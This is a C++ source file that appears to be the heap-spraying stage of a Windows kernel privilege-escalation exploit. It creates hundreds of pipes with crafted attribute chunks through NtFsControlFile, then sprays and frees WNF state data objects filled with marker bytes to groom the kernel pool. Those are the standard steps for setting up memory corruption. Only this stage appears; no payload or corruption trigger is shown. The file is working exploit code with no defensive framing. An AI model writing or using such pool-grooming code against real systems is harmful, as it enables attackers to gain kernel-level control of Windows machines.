#include "spray.h"
#include "ntos.h"
#include <iostream>
std::vector<PIPE> pipeHandles;
IO_STATUS_BLOCK statusBlock;
WNF_STATE_NAME PadStateNames1[NUM_WNDPADSPRAY] = { 0 };
WNF_STATE_NAME StateNames1[NUM_WNFSTATEDATA] = { 0 };
WNF_STATE_NAME PadStateNames2[NUM_WNDPADSPRAY] = { 0 };
WNF_STATE_NAME StateNames2[NUM_WNFSTATEDATA] = { 0 };
WNF_STATE_NAME PadStateNames3[NUM_WNDPADSPRAY2] = { 0 };
WNF_STATE_NAME StateNames3[NUM_WNFSTATEDATA2] = { 0 };
VOID sprayPipeAttributes() {
	const ULONG CHUNK_SIZE = 0x79c0;  

	char attribute[] = "attribute_name\00attribute_value";
	char output[0x100] = { 0 };

	for (int i = 0; i < SPRAY_NUM; i++) {
		HANDLE read_pipe = NULL;
		HANDLE write_pipe = NULL;

		BOOL status = CreatePipe((PHANDLE)&read_pipe, (PHANDLE)&write_pipe, NULL, 0x1000);
		if (!status) {
			printf("[-] Failed to create pipe [%d], error: %d\n", i, GetLastError());
			continue;
		}

		printf("[+] [%04d] Pipe created: R=0x%x, W=0x%x\n", i, read_pipe, write_pipe);

		PVOID pipeDataBuffer = _malloc_base(CHUNK_SIZE);
		if (!pipeDataBuffer) {
			printf("[-] Failed to allocate buffer\n");
			CloseHandle(read_pipe);
			CloseHandle(write_pipe);
			continue;
		}

		// Đặt pattern vào chunk: 8 byte header + fill 0x41
		memset((UINT8*)pipeDataBuffer, 0x41, CHUNK_SIZE);
		*(UINT64*)pipeDataBuffer = 0x5a; // Optional header

		void* controlOutBuffer = malloc(0x100);
		if (!controlOutBuffer) {
			printf("[-] Failed to allocate controlOutBuffer\n");
			free(pipeDataBuffer);
			CloseHandle(read_pipe);
			CloseHandle(write_pipe);
			continue;
		}
		memset(controlOutBuffer, 0x42, 0x100);

		NTSTATUS result = _NtFsControlFile(
			write_pipe,
			nullptr,
			nullptr,
			nullptr,
			&statusBlock,
			0x11003c,
			pipeDataBuffer,
			CHUNK_SIZE,
			controlOutBuffer,
			0x100
		);
		//NTSTATUS result = _NtFsControlFile(read_pipe, nullptr, nullptr, nullptr, &statusBlock, 0x11003c, pipeDataBuffer, CHUNK_SIZE, controlOutBuffer, 0x100);

		if (result != 0) {
			printf("[-] NtFsControlFile failed on pipe %d: 0x%X\n", i, result);
		}

		PIPE pipe;
		pipe.read_pipe = read_pipe;
		pipe.write_pipe = write_pipe;
		pipeHandles.push_back(pipe);

		free(pipeDataBuffer);
		free(controlOutBuffer);
	}

	int num_pipe = pipeHandles.size();
	printf("[+] Created %d pipes.\n", num_pipe);
	// close pipes 
	HANDLE close_read_pipe = pipeHandles[num_pipe - 10].read_pipe;
	HANDLE close_write_pipe = pipeHandles[num_pipe - 10].write_pipe;
	CloseHandle(close_read_pipe);
	CloseHandle(close_write_pipe);
	printf("[+] Closed pipe: R=0x%x, W=0x%x\n", close_read_pipe, close_write_pipe);
}

VOID sprayWNF(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[], BYTE c) {
	PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL;
	PSECURITY_DESCRIPTOR pSD = nullptr;
	NTSTATUS state = 0;
	char StateData[0x1000];

	printf("[+] Prepare _WNF_STATE_DATA spray\n");
	memset(StateData, c, sizeof(StateData));

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"", SDDL_REVISION_1, &pSD, nullptr)) {
		printf("[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed! error=%d\n", GetLastError());
		return;
	}

	for (int i = 0; i < NUM_WNDPADSPRAY; i++) {
		state = NtCreateWnfStateName(&PadStateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
		if (state != 0) {
			printf("[-] NtCreateWnfStateName failed! error=%d\n", GetLastError());
			return;
		}
	}
	for (int i = 0; i < NUM_WNFSTATEDATA; i++) {
		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE, pSD);
		if (state != 0) {
			printf("[-] NtCreateWnfStateName failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Padding _WNF_STATE_DATA spray\n");
	for (int i = 0; i < NUM_WNDPADSPRAY; i++) {
		state = NtUpdateWnfStateData(&PadStateNames[i], StateData, (0x1000 - 0x10), 0, 0, 0, 0);			// 10 bytes header
		if (state != 0) {
			printf("[-] NtUpdateWnfStateData failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Spraying _WNF_STATE_DATA\n");
	for (int i = 0; i < NUM_WNFSTATEDATA; i++) {
		state = NtUpdateWnfStateData(&StateNames[i], StateData, (0x1000 - 0x10), 0, 0, 0, 0);
		if (state != 0) {
			printf("[-] NtUpdateWnfStateData failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Done spraying _WNF_STATE_DATA\n");
}

VOID freeWNF(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[]) {
	for (int i = 0; i < NUM_WNDPADSPRAY; i++) {
		NtDeleteWnfStateData(&PadStateNames[i], NULL);
		NTSTATUS state = NtDeleteWnfStateName(&PadStateNames[i]);
		if (state != 0) {
			return;
		}
	}

	for (int i = 0; i < NUM_WNFSTATEDATA; i++) {
		NtDeleteWnfStateData(&StateNames[i], NULL);
		NTSTATUS state = NtDeleteWnfStateName(&StateNames[i]);
		if (state != 0) {
			return;
		}
	}
}

VOID sprayWNF2(WNF_STATE_NAME PadStateNames[], WNF_STATE_NAME StateNames[]) {
	PWNF_STATE_NAME_REGISTRATION PStateNameInfo = NULL;
	PSECURITY_DESCRIPTOR pSD = nullptr;
	NTSTATUS state = 0;
	char StateData[0x700];

	printf("[+] Prepare _WNF_STATE_DATA2 spray\n");
	memset(StateData, 0x44, sizeof(StateData));

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"", SDDL_REVISION_1, &pSD, nullptr)) {
		printf("[-] ConvertStringSecurityDescriptorToSecurityDescriptor failed! error=%d\n", GetLastError());
		return;
	}

	for (int i = 0; i < NUM_WNDPADSPRAY2; i++) {
		state = NtCreateWnfStateName(&PadStateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE2, pSD);
		if (state != 0) {
			printf("[-] NtCreateWnfStateName failed! error=%d\n", GetLastError());
			return;
		}
	}
	StateData[0] = 0x42;
	for (int i = 0; i < NUM_WNFSTATEDATA2; i++) {
		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, WNF_MAXBUFSIZE2, pSD);
		if (state != 0) {
			printf("[-] NtCreateWnfStateName failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Padding _WNF_STATE_DATA2 spray\n");
	for (int i = 0; i < NUM_WNDPADSPRAY2; i++) {
		*(DWORD*)&StateData[0] = i;
		state = NtUpdateWnfStateData(&PadStateNames[i], StateData, (0x700 - 0x40), 0, 0, 0, 0);
		if (state != 0) {
			printf("[-] NtUpdateWnfStateData failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Spraying _WNF_STATE_DATA2\n");
	for (int i = 0; i < NUM_WNFSTATEDATA2; i++) {
		*(DWORD*)&StateData[0] = i + 0xf000;
		state = NtUpdateWnfStateData(&StateNames[i], StateData, (0x700 - 0x40), 0, 0, 0, 0);
		if (state != 0) {
			printf("[-] NtUpdateWnfStateData failed! error=%d\n", GetLastError());
			return;
		}
	}
	Sleep(1000);
	printf("[+] Done spraying _WNF_STATE_DATA2\n");
}